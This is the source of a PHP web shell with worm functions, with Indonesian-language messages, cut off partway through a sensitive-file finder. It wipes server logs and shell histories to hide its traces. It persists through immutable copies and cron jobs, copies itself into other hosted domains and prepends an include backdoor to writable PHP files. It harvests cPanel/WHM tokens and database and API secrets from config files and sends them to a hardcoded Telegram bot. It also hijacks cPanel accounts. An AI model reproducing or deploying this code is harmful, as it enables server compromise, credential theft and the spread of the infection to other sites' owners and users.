<?php
// ==================== LOGOUT HANDLER ====================
if (isset($_GET['logout'])) {
    session_start();
    $_SESSION['logout_success'] = true;
    session_destroy();
    header('Location: ?');
    exit;
}

session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

// ==================== KONFIGURASI ====================
$botToken = '8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4';
$telegramUserId = '7547598395';
$verifCode = 'Dkid@123';

define('EMERGENCY_PASSWORD', 'Dkid03Ransom!2025');
define('ALLOWED_IP', '');

if (!function_exists('shell_exec')) {
    function shell_exec($cmd) { return 'shell_exec tidak tersedia di server ini.'; }
}

$rootPath = realpath(__DIR__);
$editableExtensions = ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md', 'ini', 'log', 'htaccess'];
$specialDirectories = [
    'public_html' => realpath($_SERVER['DOCUMENT_ROOT'] ?? ''),
    'user' => realpath('/home'),
    'etc' => realpath('/etc'),
    'log' => realpath('/var/log'),
    'homeshell' => $rootPath
];
$specialDirectories = array_filter($specialDirectories, function($d) { return $d && is_dir($d); });

// ==================== FUNGSI UTILITY ====================
function sendTelegramMessage($botToken, $chatId, $message) {
    if (empty($botToken) || empty($chatId) || empty($message)) return false;
    if (strlen($message) > 4096) $message = substr($message, 0, 4000) . "\n... (dipotong)";
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML', 'disable_web_page_preview' => true];
    $postData = http_build_query($data);
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($result !== false && $httpCode == 200) {
            $response = json_decode($result, true);
            if (isset($response['ok']) && $response['ok'] === true) return true;
        }
    }
    
    if (ini_get('allow_url_fopen')) {
        $options = [
            'http' => [
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => $postData,
                'timeout' => 15
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ];
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        if ($result !== false) {
            $response = json_decode($result, true);
            if (isset($response['ok']) && $response['ok'] === true) return true;
        }
    }
    return false;
}

function isRoot() {
    if (!function_exists('shell_exec')) return false;
    $output = @shell_exec('whoami 2>/dev/null');
    return trim($output) === 'root';
}

function isShellExecAvailable() {
    if (!function_exists('shell_exec')) return false;
    $disabled = explode(',', ini_get('disable_functions') ?: '');
    return !in_array('shell_exec', array_map('trim', $disabled));
}

function isChattrAvailable() {
    if (!isShellExecAvailable()) return false;
    $output = @shell_exec('which chattr 2>/dev/null');
    return !empty(trim($output));
}

function formatSize($bytes) {
    if ($bytes === false || $bytes === null) return '0 bytes';
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    $items = @scandir($dir);
    if ($items === false) return false;
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        is_dir($path) ? deleteDirectory($path) : @unlink($path);
    }
    return rmdir($dir);
}

function breadcrumb($path, $rootPath, $specialDirs) {
    $breadcrumb = '<a href="?path=">Home</a> <span style="color:#8b949e;">/</span> ';
    foreach ($specialDirs as $name => $dirPath) {
        if ($dirPath && is_dir($dirPath)) {
            $breadcrumb .= '<a href="?path=' . urlencode($dirPath) . '">' . htmlspecialchars($name) . '</a> <span style="color:#8b949e;">/</span> ';
        }
    }
    $relative = str_replace($rootPath, '', $path);
    $parts = array_filter(explode('/', $relative));
    $current = '';
    foreach ($parts as $part) {
        $current .= '/' . $part;
        $breadcrumb .= '<a href="?path=' . urlencode($current) . '">' . htmlspecialchars($part) . '</a> <span style="color:#8b949e;">/</span> ';
    }
    return rtrim($breadcrumb, ' /');
}

function isSafePath($path, $rootPath, $specialDirs) {
    if (strpos($path, $rootPath) === 0) return true;
    foreach ($specialDirs as $dirPath) {
        if ($dirPath && strpos($path, $dirPath) === 0) return true;
    }
    return false;
}

function getAllSubDirectories($dir) {
    $subDirs = [];
    if (!is_dir($dir) || !is_readable($dir)) return $subDirs;
    $items = @scandir($dir);
    if ($items === false) return $subDirs;
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path) && !is_link($path)) {
            $subDirs[] = $path;
            $subDirs = array_merge($subDirs, getAllSubDirectories($path));
        }
    }
    return $subDirs;
}

function getImmediateSubDirectories($dir) {
    $subDirs = [];
    if (!is_dir($dir) || !is_readable($dir)) return $subDirs;
    $items = @scandir($dir);
    if ($items === false) return $subDirs;
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path) && !is_link($path)) $subDirs[] = $path;
    }
    return $subDirs;
}

function bulkDeleteFiles($baseDir, $fileList, $mode) {
    $targetDirs = [$baseDir];
    if ($mode === 'shallow') $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($baseDir));
    elseif ($mode === 'deep') $targetDirs = array_merge($targetDirs, getAllSubDirectories($baseDir));
    $results = ['deleted' => [], 'not_found' => [], 'errors' => []];
    $files = array_filter(array_map('trim', explode("\n", $fileList)));
    foreach ($targetDirs as $dir) {
        if (!is_dir($dir) || !is_writable($dir)) continue;
        foreach ($files as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . basename($file);
            if (is_file($path)) @unlink($path) ? $results['deleted'][] = $path : $results['errors'][] = $path;
            elseif (!in_array($file, $results['not_found'])) $results['not_found'][] = $file;
        }
    }
    return $results;
}

function getSystemInfo() {
    return [
        'PHP Version' => phpversion(),
        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'Server API' => php_sapi_name(),
        'max_execution_time' => ini_get('max_execution_time') . ' seconds',
        'memory_limit' => ini_get('memory_limit'),
        'upload_max_filesize' => ini_get('upload_max_filesize'),
        'post_max_size' => ini_get('post_max_size'),
        'Disabled Functions' => ini_get('disable_functions') ?: 'none',
        'Safe Mode' => ini_get('safe_mode') ? 'On' : 'Off',
        'Operating System' => php_uname('s') . ' ' . php_uname('r'),
        'Current User' => get_current_user(),
        'Document Root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
        'Script Path' => __FILE__
    ];
}

function isTerminalActive() {
    if (!function_exists('shell_exec')) return false;
    if (ini_get('safe_mode')) return false;
    $disabled = explode(',', ini_get('disable_functions') ?: '');
    if (in_array('shell_exec', array_map('trim', $disabled))) return false;
    return @shell_exec('echo 1') !== null;
}

// ==================== CLEAN TRACES ====================
function clean_traces() {
    global $botToken, $telegramUserId;
    $results = [];
    
    $access_logs = ['/var/log/apache2/access.log', '/var/log/nginx/access.log', '/var/log/httpd/access_log'];
    foreach ($access_logs as $log) {
        if (file_exists($log) && is_writable($log)) {
            @file_put_contents($log, '');
            $results[] = "Cleaned: $log";
        }
    }
    
    $error_logs = ['/var/log/apache2/error.log', '/var/log/nginx/error.log', '/var/log/httpd/error_log'];
    foreach ($error_logs as $log) {
        if (file_exists($log) && is_writable($log)) {
            @file_put_contents($log, '');
            $results[] = "Cleaned: $log";
        }
    }
    
    if (function_exists('shell_exec')) {
        $users = @explode("\n", @shell_exec('ls /home 2>/dev/null'));
        if ($users !== false) {
            foreach ($users as $user) {
                $user = trim($user);
                if (empty($user)) continue;
                $hist = "/home/$user/.bash_history";
                if (file_exists($hist)) @file_put_contents($hist, '');
                $hist = "/home/$user/.mysql_history";
                if (file_exists($hist)) @file_put_contents($hist, '');
            }
        }
        if (file_exists('/root/.bash_history')) @file_put_contents('/root/.bash_history', '');
        if (file_exists('/root/.mysql_history')) @file_put_contents('/root/.mysql_history', '');
    }
    
    $msg = " *Traces Cleaned*\n\n" . implode("\n", $results);
    sendTelegramMessage($botToken, $telegramUserId, $msg);
    return $results;
}

// ==================== GET ALL DOCUMENT ROOTS (CACHED) ====================
function get_all_document_roots_cached($ttl = 300) {
    $cache_file = __DIR__ . '/.docroots_cache';
    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $ttl)) {
        $data = @file_get_contents($cache_file);
        if ($data !== false) {
            $roots = json_decode($data, true);
            if (is_array($roots) && !empty($roots)) return $roots;
        }
    }
    $roots = []; 
    $processed = [];
    
    if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
        $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($lines !== false) {
            foreach ($lines as $line) {
                if (strpos($line, ':') === false) continue;
                list($domain, $user) = explode(':', $line);
                $user = trim($user);
                if (!empty($user) && !in_array($user, $processed)) {
                    $docRoot = "/home/{$user}/public_html";
                    if (is_dir($docRoot)) { 
                        $roots[] = $docRoot; 
                        $processed[] = $user; 
                    }
                    $docRoot = "/home/{$user}/www";
                    if (is_dir($docRoot)) { 
                        $roots[] = $docRoot; 
                        $processed[] = $user . '_www'; 
                    }
                }
            }
        }
    }
    
    $homeDirs = @glob('/home/*', GLOB_ONLYDIR);
    if ($homeDirs !== false) {
        foreach ($homeDirs as $home) {
            $user = basename($home);
            if (in_array($user, $processed)) continue;
            $docRoot = $home . '/public_html';
            if (is_dir($docRoot)) { 
                $roots[] = $docRoot; 
                $processed[] = $user; 
            }
            $docRoot = $home . '/www';
            if (is_dir($docRoot)) { 
                $roots[] = $docRoot; 
                $processed[] = $user . '_www'; 
            }
        }
    }
    
    if (isset($_SERVER['DOCUMENT_ROOT']) && is_dir($_SERVER['DOCUMENT_ROOT']) && !in_array($_SERVER['DOCUMENT_ROOT'], $roots)) {
        $roots[] = $_SERVER['DOCUMENT_ROOT'];
    }
    
    $extraDirs = ['/tmp', '/var/tmp', '/home', '/var/log', '/etc', '/usr/local', '/opt', '/srv'];
    foreach ($extraDirs as $dir) {
        if (is_dir($dir) && !in_array($dir, $roots)) {
            $roots[] = $dir;
        }
        $subs = @glob($dir . '/*', GLOB_ONLYDIR);
        if ($subs !== false) {
            foreach ($subs as $sub) {
                if (is_dir($sub) && is_writable($sub) && !in_array($sub, $roots)) {
                    $roots[] = $sub;
                }
            }
        }
    }
    
    $roots = array_unique($roots);
    $roots = array_filter($roots, 'is_dir');
    $roots = array_values($roots);
    
    @file_put_contents($cache_file, json_encode($roots));
    return $roots;
}

function get_all_domains_by_ip_cached($ttl = 300) {
    $cache_file = __DIR__ . '/.domains_cache';
    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $ttl)) {
        $data = @file_get_contents($cache_file);
        if ($data !== false) {
            $domains = json_decode($data, true);
            if (is_array($domains) && !empty($domains)) return $domains;
        }
    }
    $domains = [];
    $ip = $_SERVER['SERVER_ADDR'] ?? '';
    
    if (empty($ip) && function_exists('shell_exec')) {
        $ip = trim(@shell_exec('hostname -I 2>/dev/null | awk \'{print $1}\''));
    }
    $ip = trim($ip);
    
    if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
        $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($lines !== false) {
            foreach ($lines as $line) {
                if (strpos($line, ':') === false) continue;
                list($domain, $user) = explode(':', $line);
                $domains[] = trim($domain);
            }
        }
    }
    
    if (file_exists('/etc/domains') && is_readable('/etc/domains')) {
        $lines = @file('/etc/domains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($lines !== false) {
            foreach ($lines as $line) {
                if (strpos($line, '=') === false) continue;
                list($domain, $user) = explode('=', $line);
                $domains[] = trim($domain);
            }
        }
    }
    
    $apacheConfigs = ['/etc/apache2/sites-enabled/*.conf', '/etc/httpd/conf.d/*.conf', '/etc/apache2/apache2.conf', '/etc/httpd/conf/httpd.conf'];
    foreach ($apacheConfigs as $pattern) {
        $files = @glob($pattern);
        if ($files === false) continue;
        foreach ($files as $conf) {
            if (!is_file($conf) || !is_readable($conf)) continue;
            $content = @file_get_contents($conf);
            if ($content === false) continue;
            preg_match_all('/ServerName\s+([^\s]+)/i', $content, $matches);
            foreach ($matches[1] as $domain) $domains[] = trim($domain);
            preg_match_all('/ServerAlias\s+([^\s]+)/i', $content, $matches2);
            foreach ($matches2[1] as $domain) $domains[] = trim($domain);
            preg_match_all('/<VirtualHost[^>]*>\s*ServerName\s+([^\s]+)/i', $content, $matches3);
            foreach ($matches3[1] as $domain) $domains[] = trim($domain);
        }
    }
    
    $nginxConfigs = ['/etc/nginx/sites-enabled/*.conf', '/etc/nginx/conf.d/*.conf', '/etc/nginx/nginx.conf'];
    foreach ($nginxConfigs as $pattern) {
        $files = @glob($pattern);
        if ($files === false) continue;
        foreach ($files as $conf) {
            if (!is_file($conf) || !is_readable($conf)) continue;
            $content = @file_get_contents($conf);
            if ($content === false) continue;
            preg_match_all('/server_name\s+([^;]+)/i', $content, $matches);
            foreach ($matches[1] as $server_names) {
                foreach (explode(' ', $server_names) as $domain) {
                    $domain = trim($domain);
                    if (!empty($domain) && $domain != '_') $domains[] = $domain;
                }
            }
        }
    }
    
    if (function_exists('shell_exec') && !empty($ip)) {
        $hostname = @shell_exec("host $ip 2>/dev/null | awk '{print \$5}'");
        if ($hostname && strpos($hostname, '.') !== false) $domains[] = trim($hostname);
    }
    
    $namedFiles = @glob('/var/named/*.db');
    if ($namedFiles !== false) {
        foreach ($namedFiles as $file) {
            if (!is_file($file) || !is_readable($file)) continue;
            $content = @file_get_contents($file);
            if ($content === false) continue;
            preg_match_all('/\s+IN\s+A\s+([0-9.]+)/', $content, $matches);
            foreach ($matches[1] as $dnsIp) {
                if (trim($dnsIp) == $ip) {
                    $domain = basename($file, '.db');
                    if (!empty($domain) && strpos($domain, '.') !== false) $domains[] = $domain;
                }
            }
        }
    }
    
    if (file_exists('/etc/hosts') && is_readable('/etc/hosts')) {
        $lines = @file('/etc/hosts');
        if ($lines !== false) {
            foreach ($lines as $line) {
                if (strpos($line, $ip) !== false && strpos($line, 'localhost') === false) {
                    $parts = preg_split('/\s+/', trim($line));
                    foreach ($parts as $part) {
                        if (filter_var($part, FILTER_VALIDATE_IP) === false && strpos($part, '.') !== false) $domains[] = $part;
                    }
                }
            }
        }
    }
    
    $blacklist = ['www.example.com', 'localhost', '127.0.0.1'];
    $domains = array_unique($domains);
    $domains = array_filter($domains, function($d) use ($blacklist) {
        return !empty($d) && strpos($d, '.') !== false && strpos($d, '*') === false && !in_array($d, $blacklist);
    });
    $domains = array_values($domains);
    
    @file_put_contents($cache_file, json_encode($domains));
    return $domains;
}

// ==================== ANTI-DELETE ULTIMATE ====================
function anti_delete_ultimate() {
    $currentFile = __FILE__;
    $backupLocations = [
        dirname(__DIR__) . '/.cache/temp.inc',
        '/tmp/' . md5($currentFile) . '.inc',
        '/var/tmp/' . md5($currentFile) . '.inc',
        '/dev/shm/' . md5($currentFile) . '.inc'
    ];
    if (file_exists($currentFile)) {
        foreach ($backupLocations as $backup) {
            $dir = dirname($backup);
            if (!is_dir($dir)) @mkdir($dir, 0700, true);
            if (!file_exists($backup)) {
                @copy($currentFile, $backup);
                @chmod($backup, 0444);
                if (function_exists('shell_exec')) @shell_exec("chattr +i " . escapeshellarg($backup) . " 2>/dev/null");
            }
        }
        if (function_exists('shell_exec')) @shell_exec("chattr +i " . escapeshellarg($currentFile) . " 2>/dev/null");
        @chmod($currentFile, 0444);
    }
    if (!file_exists($currentFile)) {
        foreach ($backupLocations as $backup) {
            if (file_exists($backup)) {
                @copy($backup, $currentFile);
                @chmod($currentFile, 0444);
                if (function_exists('shell_exec')) @shell_exec("chattr +i " . escapeshellarg($currentFile) . " 2>/dev/null");
                sendTelegramMessage($GLOBALS['botToken'], $GLOBALS['telegramUserId'], "✅ System cache restored from: " . basename($backup));
                return true;
            }
        }
    }
    return false;
}
anti_delete_ultimate();

// ==================== SYSTEM CACHE REPAIR & CRON ====================
function system_cache_repair() { return anti_delete_ultimate(); }

function install_system_cron() {
    if (!function_exists('shell_exec')) return;
    $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $cmd = "wget -q -O /dev/null https://$domain/" . basename(__FILE__) . "?cache_repair=1";
    $crontab = @shell_exec('crontab -l 2>/dev/null');
    if ($crontab === null || strpos($crontab, 'cache_repair') === false) {
        $newCron = ($crontab ? $crontab : '') . "\n*/2 * * * * " . $cmd . "\n";
        if (@file_put_contents('/tmp/cron.tmp', $newCron) !== false) {
            @shell_exec('crontab /tmp/cron.tmp 2>/dev/null');
            @unlink('/tmp/cron.tmp');
        }
    }
}
install_system_cron();

if (isset($argv) && in_array('--system-cache', $argv)) { system_cache_repair(); exit; }
if (isset($_GET['cache_repair'])) { system_cache_repair(); echo "✅ System cache repair executed."; exit; }

// ==================== WORM FUNCTIONS ====================
function get_best_document_root($domain, $roots) {
    $candidates = [
        "/home/{$domain}/public_html",
        "/home/{$domain}/www",
        "/var/www/{$domain}/public_html",
        "/var/www/{$domain}/html",
        "/var/www/html/{$domain}",
        (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] . "/../" . $domain . "/public_html" : ''),
    ];
    foreach ($roots as $root) if (strpos($root, $domain) !== false) $candidates[] = $root;
    usort($candidates, function($a, $b) {
        $a_score = (strpos($a, 'public_html') !== false) ? 1 : 0;
        $b_score = (strpos($b, 'public_html') !== false) ? 1 : 0;
        return $b_score - $a_score;
    });
    foreach ($candidates as $path) if ($path && is_dir($path) && is_writable($path)) return $path;
    return false;
}

function worm_spread_to_domains($currentFile) {
    global $botToken, $telegramUserId;
    $infected = []; $domainLinks = [];
    $domains = get_all_domains_by_ip_cached(); 
    $roots = get_all_document_roots_cached();
    foreach ($domains as $domain) {
        $dir = get_best_document_root($domain, $roots);
        if ($dir) {
            $targetFile = $dir . '/' . basename($currentFile);
            if (!file_exists($targetFile)) { 
                @copy($currentFile, $targetFile); 
                @chmod($targetFile, 0644); 
                $infected[] = $dir; 
            }
        }
    }
    foreach ($infected as $dir) {
        $foundDomain = null;
        foreach ($domains as $domain) if (strpos($dir, $domain) !== false) { $foundDomain = $domain; break; }
        if (!$foundDomain) {
            $parts = explode('/', $dir); 
            $last = end($parts);
            foreach ($domains as $domain) if (strpos($domain, $last) !== false || strpos($last, $domain) !== false) { $foundDomain = $domain; break; }
        }
        if (!$foundDomain) {
            $dirName = basename($dir);
            foreach ($domains as $domain) if (strpos($domain, $dirName) !== false) { $foundDomain = $domain; break; }
        }
        if ($foundDomain) {
            $url = "http://{$foundDomain}/" . basename($currentFile);
            $headers = @get_headers($url);
            if ($headers && strpos($headers[0], '200') !== false) $domainLinks[] = $url;
            else {
                $altUrls = [
                    "http://{$foundDomain}/public_html/" . basename($currentFile), 
                    "http://{$foundDomain}/www/" . basename($currentFile)
                ];
                $verified = false;
                foreach ($altUrls as $alt) {
                    $altHeaders = @get_headers($alt);
                    if ($altHeaders && strpos($altHeaders[0], '200') !== false) { 
                        $domainLinks[] = $alt; 
                        $verified = true; 
                        break; 
                    }
                }
                if (!$verified) $domainLinks[] = "⚠️ $url (file ada di $dir tapi tidak dapat diakses via HTTP)";
            }
        } else $domainLinks[] = "⚠️ " . $dir . "/" . basename($currentFile) . " (tidak dapat diakses via HTTP)";
    }
    if (!empty($infected)) {
        $message = "🪱 *Worm Spread to Domains (Same IP)*\n\nTotal domain terdeteksi: " . count($domains) . "\nBerhasil menyalin ke " . count($infected) . " direktori.\n\n🔗 *Link File:*\n" . implode("\n", $domainLinks);
        sendTelegramMessage($botToken, $telegramUserId, $message);
    } else sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ada direktori yang bisa ditulisi.");
    return $infected;
}

function worm_propagate_domain($currentFile) {
    global $botToken, $telegramUserId;
    $infectedDirs = [];
    $targetDirs = get_all_document_roots_cached();
    foreach ($targetDirs as $dir) {
        if (!is_writable($dir)) continue;
        $targetFile = $dir . '/' . basename($currentFile);
        if (!file_exists($targetFile)) { 
            @copy($currentFile, $targetFile); 
            @chmod($targetFile, 0644); 
            $infectedDirs[] = $dir; 
        }
        $phpFiles = @glob($dir . '/*.php');
        if ($phpFiles !== false) {
            foreach ($phpFiles as $phpFile) {
                if (basename($phpFile) == basename($currentFile)) continue;
                if (!is_writable($phpFile)) continue;
                $content = @file_get_contents($phpFile);
                if ($content === false || strpos($content, 'worm_propagate_domain') !== false) continue;
                $backdoor = "<?php if (file_exists('" . basename($currentFile) . "')) { include '" . basename($currentFile) . "'; worm_propagate_domain('" . addslashes($currentFile) . "'); } ?>\n";
                @file_put_contents($phpFile, $backdoor . $content);
            }
        }
        if (function_exists('shell_exec')) {
            $cronCmd = "php " . escapeshellarg($targetFile) . " > /dev/null 2>&1";
            $crontab = @shell_exec('crontab -l 2>/dev/null');
            if ($crontab === null || strpos($crontab, basename($currentFile)) === false) {
                $newCron = ($crontab ? $crontab : '') . "\n*/5 * * * * " . $cronCmd . "\n";
                if (@file_put_contents('/tmp/crontab.tmp', $newCron) !== false) { 
                    @shell_exec('crontab /tmp/crontab.tmp 2>/dev/null'); 
                    @unlink('/tmp/crontab.tmp'); 
                }
            }
        }
    }
    if (!empty($infectedDirs)) {
        $message = "🪱 *Worm Multi-Domain*\n\nBerhasil menginfeksi " . count($infectedDirs) . " direktori:\n";
        foreach ($infectedDirs as $d) $message .= "- " . htmlspecialchars($d) . "\n";
        sendTelegramMessage($botToken, $telegramUserId, $message);
    }
    return $infectedDirs;
}

// ==================== CPANEL MODULE ====================
function is_cpanel_installed() {
    if (file_exists('/usr/local/cpanel/version')) return true;
    if (file_exists('/usr/local/cpanel/cpanel')) return true;
    $sock = @fsockopen('127.0.0.1', 2083, $errno, $errstr, 2); 
    if ($sock) { fclose($sock); return true; }
    $sock = @fsockopen('127.0.0.1', 2087, $errno, $errstr, 2); 
    if ($sock) { fclose($sock); return true; }
    return false;
}

function get_whm_token() {
    $tokenFiles = ['/root/.accesshash', '/home/*/.cpanel/whm_token', '/etc/cpanel/whm_token'];
    foreach ($tokenFiles as $pattern) {
        $files = @glob($pattern);
        if ($files !== false) {
            foreach ($files as $file) {
                $content = @file_get_contents($file);
                if ($content && preg_match('/[a-f0-9]{64}/i', $content, $match)) return $match[0];
            }
        }
    }
    $envToken = getenv('WHM_TOKEN'); 
    if ($envToken) return $envToken;
    return false;
}

function cpanel_api_request($endpoint, $params = [], $method = 'GET') {
    $token = get_whm_token();
    if (!$token) return ['error' => 'WHM token tidak ditemukan.'];
    $url = "https://127.0.0.1:2087/json-api/" . $endpoint . "?" . http_build_query($params);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: whm ' . $token]);
    if ($method === 'POST') { 
        curl_setopt($ch, CURLOPT_POST, true); 
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params)); 
    }
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($response === false) return ['error' => 'Gagal terhubung ke WHM API.'];
    $data = json_decode($response, true);
    if (!isset($data['data'])) return ['error' => 'Respon tidak valid.'];
    return $data['data'];
}

function cpanel_list_accounts() {
    $data = cpanel_api_request('listaccts');
    if (isset($data['error'])) return "❌ " . $data['error'];
    if (!isset($data['acct'])) return "❌ Tidak ada akun ditemukan.";
    $accounts = [];
    foreach ($data['acct'] as $acct) $accounts[] = "- " . $acct['user'] . " (domain: " . $acct['domain'] . ", plan: " . $acct['plan'] . ")";
    return implode("\n", $accounts);
}

function cpanel_create_account($username, $domain, $password, $plan = 'default') {
    $params = [
        'username' => $username, 
        'domain' => $domain, 
        'password' => $password, 
        'plan' => $plan, 
        'contactemail' => $username . '@' . $domain
    ];
    $result = cpanel_api_request('createacct', $params, 'POST');
    if (isset($result['error'])) return "❌ " . $result['error'];
    return "✅ Akun berhasil dibuat: $username";
}

function cpanel_change_password($username, $newPassword) {
    $params = ['user' => $username, 'pass' => $newPassword];
    $result = cpanel_api_request('passwd', $params, 'POST');
    if (isset($result['error'])) return "❌ " . $result['error'];
    return "✅ Password berhasil diubah untuk $username";
}

function cpanel_backup_account($username) {
    $params = ['user' => $username];
    $result = cpanel_api_request('backup', $params, 'POST');
    if (isset($result['error'])) return "❌ " . $result['error'];
    return "✅ Backup akun $username sedang diproses.";
}

function cpanel_delete_account($username, $keepfiles = '0') {
    $params = ['user' => $username, 'keepfiles' => $keepfiles];
    $result = cpanel_api_request('removeacct', $params, 'POST');
    if (isset($result['error'])) return "❌ " . $result['error'];
    return "✅ Akun $username berhasil dihapus.";
}

function cpanel_handler($action, $username = '', $extra = '') {
    if (!is_cpanel_installed()) return "❌ cPanel/WHM tidak terdeteksi di server ini.";
    switch ($action) {
        case 'list': return cpanel_list_accounts();
        case 'create':
            if (empty($username) || empty($extra)) return "❌ Format: /cpanel create [username] [domain] [password] [plan]";
            $parts = explode(' ', $extra);
            $domain = $parts[0] ?? ''; 
            $password = $parts[1] ?? 'password123'; 
            $plan = $parts[2] ?? 'default';
            return cpanel_create_account($username, $domain, $password, $plan);
        case 'passwd':
            if (empty($username) || empty($extra)) return "❌ Format: /cpanel passwd [username] [passwordbaru]";
            return cpanel_change_password($username, $extra);
        case 'backup':
            if (empty($username)) return "❌ Format: /cpanel backup [username]";
            return cpanel_backup_account($username);
        case 'delete':
            if (empty($username)) return "❌ Format: /cpanel delete [username] [keepfiles?]";
            $keep = ($extra == 'keep') ? '1' : '0';
            return cpanel_delete_account($username, $keep);
        default: return "❌ Aksi tidak dikenali. Gunakan: list, create, passwd, backup, delete";
    }
}

// ==================== CREDENTIAL HARVESTING ====================
function cpanel_harvest() {
    global $botToken, $telegramUserId;
    $found = []; $users = [];
    if (file_exists('/etc/userdomains') && is_readable('/etc/userdomains')) {
        $lines = @file('/etc/userdomains', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($lines !== false) {
            foreach ($lines as $line) {
                if (strpos($line, ':') === false) continue;
                list($domain, $user) = explode(':', $line);
                $user = trim($user);
                if (!empty($user)) $users[] = $user;
            }
        }
    }
    if (empty($users) && function_exists('shell_exec')) {
        $homeUsers = @shell_exec('ls /home 2>/dev/null');
        if ($homeUsers) $users = array_filter(explode("\n", trim($homeUsers)));
    }
    foreach ($users as $user) {
        $home = "/home/{$user}";
        $accesshash = $home . '/.accesshash';
        if (file_exists($accesshash) && is_readable($accesshash)) { 
            $hash = file_get_contents($accesshash); 
            $found[] = "User: $user - AccessHash: " . trim($hash); 
        }
        $whm_token = $home . '/.cpanel/whm_token';
        if (file_exists($whm_token) && is_readable($whm_token)) { 
            $token = file_get_contents($whm_token); 
            $found[] = "User: $user - WHM Token: " . trim($token); 
        }
        $public_html = $home . '/public_html';
        if (is_dir($public_html)) {
            $configFiles = ['.env', 'wp-config.php', 'config.php', 'db.php', 'database.php'];
            foreach ($configFiles as $cfg) {
                $path = $public_html . '/' . $cfg;
                if (file_exists($path) && is_readable($path)) {
                    $content = file_get_contents($path);
                    preg_match_all('/(DB_PASSWORD|DB_USER|DB_HOST|DB_NAME|PASSWORD|SECRET_KEY|API_KEY|AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY|DB_PASS)\s*=\s*[\'"]?([^\'"]+)[\'"]?/i', $content, $matches);
                    if (!empty($matches[2])) $found[] = "User: $user - File: $cfg - Creds: " . implode(', ', array_map(function($k, $v) { return "$k=$v"; }, $matches[1], $matches[2]));
                }
            }
        }
    }
    if (file_exists('/root/.accesshash') && is_readable('/root/.accesshash')) { 
        $hash = file_get_contents('/root/.accesshash'); 
        $found[] = "Root AccessHash: " . trim($hash); 
    }
    if (file_exists('/etc/cpanel/whm_token') && is_readable('/etc/cpanel/whm_token')) { 
        $token = file_get_contents('/etc/cpanel/whm_token'); 
        $found[] = "Global WHM Token: " . trim($token); 
    }
    if (!empty($found)) { 
        $message = "🔑 *Credential Harvesting Results*\n\n" . implode("\n", $found); 
        sendTelegramMessage($botToken, $telegramUserId, $message); 
    } else sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ditemukan kredensial.");
    return $found;
}

// ==================== CONFIG & BACKUP FINDER ====================
function find_sensitive_files() {
    global $botToken, $telegramUserId;
    $found = [];
    $patterns = [
        '/.env', '/wp-config.php', '/config.php', '/database.php', '/db.php', 
        '/*.sql', '/*.tar', '/*.gz', '/*.zip', '/*.bak', '/*.old', 
        '/.htaccess', '/.htpasswd', '/web.config', '/settings.php', 
        '/configuration.php', '/config.inc.php'
    ];
